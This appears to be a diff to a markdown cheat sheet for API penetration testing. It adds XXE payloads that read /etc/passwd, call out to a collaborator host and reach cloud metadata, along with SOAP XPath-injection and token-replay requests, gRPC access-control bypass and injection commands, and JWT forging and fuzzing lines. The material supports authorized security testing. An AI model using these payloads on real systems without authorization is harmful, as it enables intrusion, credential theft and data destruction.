@@ -1,8 +1,8 @@
+#quick-reference #payloads #cheat-sheet #api-testing #owasp #soap #grpc #graphql #jwt #ssrf #injection
+
 # API Quick Reference Guide
 
 Fast lookup for common payloads, techniques, and testing patterns. Keep this handy during active testing for quick wins.
-
-Related: [[API-02-Technical-Testing-Checklist]] | [[API-03-Request-Tracker]]
 
 ---
 
@@ -292,6 +292,100 @@ http://evil.com → redirects to localhost
 
 ---
 
+### XXE Injection
+
+**In-band (file read)**:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><data>&xxe;</data></root>
+```
+
+**OOB (blind — DNS callback)**:
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR.net/xxe">]>
+```
+
+**SSRF via XXE (cloud metadata)**:
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+```
+
+**Test in**: XML body (`Content-Type: application/xml`), file uploads, SOAP envelopes, any endpoint accepting XML
+
+---
+
+### SOAP Quick Tests
+
+**WSDL discovery**:
+```bash
+curl https://api.target.com/service?wsdl
+curl https://api.target.com/service?WSDL
+curl https://api.target.com/service?singleWsdl
+```
+
+**XPath injection (auth bypass)**:
+```xml
+<username>admin' or '1'='1</username>
+<password>x</password>
+```
+
+**SOAPAction mismatch** (action says read, body says delete):
+```http
+POST /service HTTP/1.1
+Content-Type: text/xml
+SOAPAction: "http://target.com/GetUser"
+
+<soap:Envelope><soap:Body>
+  <DeleteUser><id>1</id></DeleteUser>
+</soap:Body></soap:Envelope>
+```
+
+**WS-Security token replay** (resend captured token):
+```xml
+<wsse:UsernameToken>
+  <wsse:Username>admin</wsse:Username>
+  <wsse:Password Type="PasswordText">password</wsse:Password>
+</wsse:UsernameToken>
+```
+
+---
+
+### gRPC Quick Tests
+
+**Enumerate via reflection**:
+```bash
+grpcurl -plaintext api.target.com:50051 list
+grpcurl -plaintext api.target.com:50051 list target.UserService
+grpcurl -plaintext api.target.com:50051 describe target.UserService.GetUser
+```
+
+**BOLA — access another user's data**:
+```bash
+grpcurl -plaintext \
+  -H "authorization: Bearer <user_a_token>" \
+  -d '{"user_id": 2}' \
+  api.target.com:50051 target.UserService/GetUser
+```
+
+**BFLA — call admin method as regular user**:
+```bash
+grpcurl -plaintext \
+  -H "authorization: Bearer <user_token>" \
+  -d '{"user_id": 1}' \
+  api.target.com:50051 target.AdminService/DeleteUser
+```
+
+**Injection in proto field**:
+```bash
+grpcurl -plaintext \
+  -H "authorization: Bearer <token>" \
+  -d '{"user_id": "1 OR 1=1"}' \
+  api.target.com:50051 target.UserService/GetUser
+```
+
+---
+
 ### GraphQL Attacks
 
 **Introspection Query**:
@@ -566,23 +660,31 @@ jwt_tool [TOKEN]
 # JWT brute force
 python3 jwt_tool.py [TOKEN] -C -d wordlist.txt
 
-# SQLMap
+# JWT forge after cracking secret
+python3 jwt_tool.py [TOKEN] -T -S hs256 -p "found_secret"
+
+# SQLMap with auth header
 sqlmap -u "URL" --headers="Authorization: Bearer TOKEN"
 
 # Arjun (param discovery)
-arjun -u URL
+arjun -u https://api.target.com/endpoint
 
 # ffuf (endpoint fuzzing)
-ffuf -u https://api.target.com/FUZZ -w wordlist.txt
+ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
+
+# ffuf (parameter fuzzing)
+ffuf -u https://api.target.com/endpoint?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+
+# grpcurl (gRPC enumeration)
+grpcurl -plaintext api.target.com:50051 list
+
+# grpcurl (gRPC with TLS)
+grpcurl api.target.com:443 list
 
 # Burp Intruder positions
-GET /api/users/§123§/profile§PARAM§
+GET /api/users/§123§/profile
+POST /api/login  {"username":"§admin§","password":"§password§"}
 ```
-
----
-
-## Tags
-#quick-reference #payloads #cheat-sheet #api-testing #owasp
 
 ---
 
@@ -596,5 +698,6 @@ GET /api/users/§123§/profile§PARAM§
 
 ---
 *Created: 2026-01-21*
+*Updated: 2026-03-06*
 *Tester: Er2oneousbit*
-*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
+*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.6*
